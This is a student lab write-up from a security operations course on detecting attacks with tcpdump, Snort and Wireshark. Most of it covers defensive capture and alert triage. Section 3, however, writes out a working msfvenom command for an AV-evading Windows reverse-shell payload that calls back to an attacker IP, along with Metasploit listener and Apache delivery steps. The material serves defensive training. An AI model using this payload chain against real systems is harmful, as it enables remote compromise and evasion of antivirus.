# Intrusion Detection using Snort

**Course:** DeVry University – SEC455: Security Operations Center  
**Lab Platform:** ACI Learning / InfoSec Learning  
**CompTIA Security+ Mapping:** Domain 3.0 – Implementation | Objective 3.3: Implement a secure network design

---

## Overview

This lab is part of a series supporting Ethical Hacker training courseware, funded by the Department of Labor (DOL) TAACCCT Grant No. TC-22525-11-60-A-48. Students configure a passive network sniffer, capture traffic on internal and external segments, and use Snort IDS signatures to detect both unwanted incoming and outgoing traffic.

---

## Objectives

- Set up a network sniffer on the Kali sensor using `tcpdump`
- Detect unwanted **incoming** traffic (FTP brute-force attack) using Snort
- Detect unwanted **outgoing** traffic (reverse shell callback) using Wireshark

---

## Key Terms

| Tool | Description |
|------|-------------|
| **Wireshark** | Protocol analyzer for reading PCAP files; captures live traffic on Windows, Linux, and macOS |
| **Snort** | Open-source IDS that analyzes traffic using rule-based signatures; available at snort.org |
| **tcpdump** | Linux/UNIX CLI tool for capturing network traffic; pre-installed on most distros |
| **Sniffer** | Any tool (Wireshark, tcpdump, Network Miner) used to capture network traffic |
| **PCAP File** | Saved network capture format readable by Wireshark or Network Miner |

---

## Lab Environment

| Host | Role | IP |
|------|------|----|
| Kali 2 Sniffer | Passive IDS sensor | No routable IP (promiscuous mode) |
| Internal Windows Server 2008 | Victim / internal host | 192.168.1.x |
| External Kali 2 | Attacker / payload host | 216.1.1.100 |
| Windows 7 | Attacker (brute-force) | Internal segment |
| Firewall | Network boundary | 216.1.1.1 (external) |

The Kali sniffer sits on a switch SPAN/mirror port, receiving copies of traffic from both the internal (`192.168.1.0/24`) and external (`216.0.0.0/8`) segments via `eth0` and `eth1`.

---

## Section 1 – Setting Up the Sniffer

### Procedure

```bash
# Enumerate interfaces
ifconfig

# Bring both interfaces up without IP (promiscuous/passive mode)
ifconfig eth0 0.0.0.0 up
ifconfig eth1 0.0.0.0 up

# Live capture on internal segment
tcpdump -i eth0

# Live capture on external segment
tcpdump -i eth1

# Write full-packet captures to disk
tcpdump -i eth0 -nnntt -s 0 -w capnet1.cap -C 100
tcpdump -i eth1 -nnntt -s 0 -w capnet2.cap -C 100

# Open captures in Wireshark to verify
wireshark capnet1.cap
wireshark capnet2.cap
```

### tcpdump Flags

| Flag | Purpose |
|------|---------|
| `-i eth0` / `-i eth1` | Selects capture interface |
| `-nnntt` | Disables DNS/service-name resolution; changes timestamp format |
| `-s 0` | Captures full packet (up to 65,536 bytes) instead of default 96-byte snapshot |
| `-w <file>` | Writes packets to PCAP file |
| `-C 100` | Rotates capture file at configured size threshold |

### Key Notes
- **Promiscuous mode** allows the NIC to accept all frames on the segment, not just those addressed to its own MAC.
- On a switched network, the sniffer also requires a **SPAN/mirror port** to receive unicast traffic from other hosts.
- `tcpdump --help` displays all available options.

---

## Section 2 – Detecting Unwanted Incoming Attacks

**Scenario:** A Windows 7 attacker enumerates the firewall at `216.1.1.1` via Nmap, then launches a dictionary-based FTP brute-force attack against the `administrator` account using Bruter with `Wordlist.txt`. The Kali sniffer captures all resulting traffic on `eth0`.

### Procedure

```bash
# Kali Sniffer – capture internal traffic during attack
tcpdump -i eth0 -nnntt -s 0 -w brute.cap -C 100

# Windows 7 – enumerate firewall services
nmap 216.1.1.1

# Windows 7 – run Bruter FTP password test
# Target: 216.1.1.1 | User: administrator | Dictionary: Wordlist.txt

# Kali Sniffer – stop capture (Ctrl+C), then analyze with Snort
snort -l . -c /etc/snort/snort.conf -r brute.cap

# Verify Snort output file
ls

# Review alerts
leafpad alert.ids
```

### SOC Interpretation
High-volume, closely-timed FTP authentication events in `alert.ids` are a strong indicator of brute-force activity. Snort reduces the raw PCAP into alert evidence that can be triaged by time, source/destination IP, protocol, and signature message—a core SOC analyst workflow.

### Discussion Answers
1. Snort generates **`alert.ids`** to provide details about detected malicious activity.
2. Command to analyze a PCAP with Snort: `snort -l . -c /etc/snort/snort.conf -r brute.cap`
3. **Bruter** performs dictionary-based password-guessing against network services.
4. A **brute-force attack** systematically tries credential combinations until a valid one is found.

---

## Section 3 – Detecting Unwanted Outgoing Traffic

**Scenario:** An external attacker creates a Windows reverse-shell payload (`bad.exe`) using `msfvenom`, hosts it via Apache, and tricks an internal Windows Server host into downloading and executing it. The payload calls back to the attacker on TCP port 443. The Kali sniffer captures the resulting outbound traffic.

### Payload Generation (External Kali)

```bash
msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp lhost=216.1.1.100 lport=443 -f exe -e x86/shikata_ga_nai -o bad.exe
```

| Flag | Value | Purpose |
|------|-------|---------|
| `-a x86` | x86 | Target architecture |
| `--platform Windows` | Windows | Target OS |
| `-p windows/shell/reverse_tcp` | Reverse TCP shell | Payload type |
| `lhost=216.1.1.100` | Attacker IP | Callback address |
| `lport=443` | TCP 443 | Callback port (blends with HTTPS traffic) |
| `-f exe` | exe | Output format |
| `-e x86/shikata_ga_nai` | Encoder | Polymorphic XOR encoder to evade AV |
| `-o bad.exe` | bad.exe | Output filename |

> **`shikata_ga_nai`** (仕方がない) — Japanese: *"It cannot be helped."* In Metasploit, it is a polymorphic XOR additive feedback encoder that mutates the payload on each generation, making static AV signatures less effective.

### Listener Setup (External Kali)

```bash
service postgresql start
msfconsole
use exploit/multi/handler
set lhost 216.1.1.100
set lport 443
set payload windows/shell/reverse_tcp
show options
exploit
```

### Web Server Setup (External Kali – 2nd Terminal)

```bash
apache2ctl start
netstat -tan       # Verify port 80 is listening
nmap 127.0.0.1     # Confirm open ports
cp bad.exe /var/www/html
ls /var/www/html
```

Default Kali web root: `/var/www/html`

### Victim Action (Internal Windows Server)

Browse to `http://216.1.1.100/bad.exe` and select **Run** twice. This simulates a user downloading malware delivered via phishing or a malicious search result.

### Traffic Capture and Analysis (Kali Sniffer)

```bash
# Capture during attack
tcpdump -i eth0 -nntttt -s 0 -w badtraffic.cap

# Stop (Ctrl+C), then open in Wireshark
wireshark badtraffic.cap
```

In Wireshark:
1. Apply filter: `frame contains "Microsoft Windows"`
2. Right-click the result → **Follow TCP Stream**
3. Review the reverse-shell command banner for the Windows version string.

### SOC Interpretation
A reverse shell initiates an **outbound** connection from the compromised internal host to the attacker's infrastructure. This bypasses inbound firewall rules. The `frame contains "Microsoft Windows"` filter targets the Windows command-prompt banner text, allowing an analyst to quickly identify interactive shell sessions within large PCAP files.

### Discussion Answers
1. Verify Apache is listening: `netstat -tan` or `nmap 127.0.0.1` — look for port 80 in output.
2. Wireshark filter to find Windows command shell traffic: `frame contains "Microsoft Windows"`
3. Default Kali web-root directory: `/var/www/html`

---

## Skills Demonstrated

- Passive network monitoring and full-packet capture with `tcpdump`
- IDS configuration and offline PCAP analysis with Snort
- Payload creation and delivery simulation with `msfvenom` and Metasploit
- Network traffic investigation and stream analysis with Wireshark
- SOC analyst workflow: capture → analyze → alert triage → investigate
- Distinguishing inbound brute-force attacks from outbound reverse-shell callbacks

---

## Tools Used

- Snort (IDS)
- Wireshark
- tcpdump
- Metasploit Framework / msfvenom
- Apache2
- Nmap
- Bruter

---

*Lab completed as part of SEC455 – Security Operations Center coursework | KaizenByte Portfolio*
